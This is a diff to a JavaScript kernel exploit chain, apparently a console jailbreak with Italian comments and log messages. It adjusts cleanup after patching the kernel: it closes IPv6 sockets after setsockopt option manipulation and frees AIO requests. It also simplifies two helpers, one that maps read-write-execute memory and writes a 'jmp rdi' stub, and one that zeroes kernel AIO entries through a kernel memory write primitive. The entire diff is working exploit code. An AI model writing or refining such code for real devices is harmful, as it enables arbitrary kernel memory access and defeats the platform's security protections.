@@ -1608,6 +1608,20 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     localStorage.ExploitLoaded="yes"
     sessionStorage.ExploitLoaded="yes";
    //alert("kernel exploit succeeded!");
+
+    for (const sd of sds) {
+  try {
+    setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+    setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, 0, 0);
+    setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
+  } catch (e) {}
+  try {
+    close(sd);
+  } catch (e) {}
+}
+
+    free_aios2(leak_ids.addr, leak_ids.length);   
+   aio_multi_delete(block_id.addr, 1);  
 }
 
 
@@ -1684,50 +1698,27 @@ function runBinLoader() {
 }
 
 function allocate_jit_stub() {
-  const PROT_READ   = 1;
-  const PROT_WRITE  = 2;
-  const PROT_EXEC   = 4;
-  const MAP_ANON    = 0x1000;
-  const MAP_PRIVATE = 0x2;
+    const PROT_READ = 1, PROT_WRITE = 2, PROT_EXEC = 4;
+  const MAP_ANON = 0x1000, MAP_PRIVATE = 0x2;
 
-  
-  const stub_addr = chain.sysp(
-    'mmap',
-    new Int(0x10000, 0),
-    0x1000,
-    PROT_READ | PROT_WRITE | PROT_EXEC,
-    MAP_ANON | MAP_PRIVATE,
-    -1,
-    0
-  );
- 
-  const stub_buf = new Uint8Array([
-    0xFF, 0xE7, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
-  ]);
+  const stub_addr = chain.sysp('mmap', new Int(0x10000, 0), 0x1000,
+                                PROT_READ | PROT_WRITE | PROT_EXEC,
+                                MAP_ANON | MAP_PRIVATE, -1, 0);
 
-  // Copiamo i byte in memoria utente “stub_addr”
-  const tmp = array_from_address(stub_addr, stub_buf.length);
-  tmp.set(stub_buf);
+  const code = new Uint8Array([0xFF, 0xE7]); // jmp rdi
+  const tmp = array_from_address(stub_addr, code.length);
+  tmp.set(code);
 
-  log(`✅ JIT‐stub scritto a 0x${stub_addr.toString(16)}`);
+  log(`✅ JIT stub scritto a ${stub_addr}`);
   return stub_addr;
 }
 
         
-function zero_out_aio_only(kmem, addr) {
-  const totalSize = 0x80;      // dimensione completa di un aio_entry
-  const skip      = 8;         // non tocchiamo i primi 8 byte
-  const toZero    = totalSize - skip; // 0x80 - 8 = 120 byte
-
-   
-  const zero_buf = new Buffer(toZero);
-  zero_buf.fill(0);
-
-  
-  const target = addr.add(skip);
-  kmem.copyin(zero_buf.addr, target, toZero);
-
-  log(`✅ Azzerrati ${toZero} byte di AIO a partire da 0x${target.toString(16)}`);
+function zero_out_aio(kmem, addr) {
+ const buf = new Buffer(0x80);
+  buf.fill(0);
+  kmem.copyin(buf.addr, addr, buf.size);
+  log(`✅ AIO @ ${addr} azzerato`);
 }
     
 
@@ -1834,7 +1825,7 @@ const stub_addr = allocate_jit_stub();
         
      log('___________________TEST___________________________________');
         debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "prima");
-      zero_out_aio_only(kmem, reqs1_addr);
+      zero_out_aio(kmem, reqs1_addr);
     debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "Dopo pulizia");
 
 
